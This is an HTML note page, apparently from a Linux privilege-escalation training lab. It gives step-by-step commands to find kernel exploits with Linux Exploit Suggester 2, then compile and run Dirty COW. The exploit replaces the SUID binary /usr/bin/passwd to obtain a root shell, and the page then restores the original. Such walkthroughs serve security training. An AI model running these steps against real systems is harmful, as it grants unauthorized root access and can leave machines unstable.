<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Kernel Exploits</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Kernel Exploits</h1><br/><p><strong><h1>Kernel Exploits</h1></strong></p><p></p><p></p><p></p><p>Kernel exploits can leave the system in an <strong>unstable</strong> state, which is why you should only run them as a <strong>last resort</strong>.</p><p></p><p>Run the Linux Exploit Suggester 2 tool to identify potential kernel exploits on the current system:</p><p></p><p><strong>perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl</strong></p><p></p><p>The popular Linux kernel exploit &quot;<strong>Dirty COW</strong>&quot; should be listed. Exploit code for Dirty COW can be found at /home/user/tools/kernel-exploits/dirtycow/c0w.c. It replaces the <strong>SUID</strong> file <strong>/usr/bin/passwd</strong> with one that <strong>spawns</strong> a <strong>shell</strong> (a <strong>backup</strong> of <strong>/usr/bin/passwd</strong> is made at <strong>/tmp/bak</strong>).</p><p></p><p>Compile the code and run it (note that it may take several minutes to complete):</p><p></p><p><strong>gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w</strong></p><p><strong>./c0w</strong></p><p></p><p>Once the exploit completes, run /usr/bin/passwd to gain a root shell:</p><p></p><p><strong>/usr/bin/passwd</strong></p><p></p><p>Remember to restore the original /usr/bin/passwd file and exit the root shell before continuing!</p><p></p><p><strong>mv /tmp/bak /usr/bin/passwd</strong></p><p><strong>exit</strong></p><p></p><p></p><p></p><p><strong><h2>END</h2></strong></p><p></p></div>
</body>
</html>
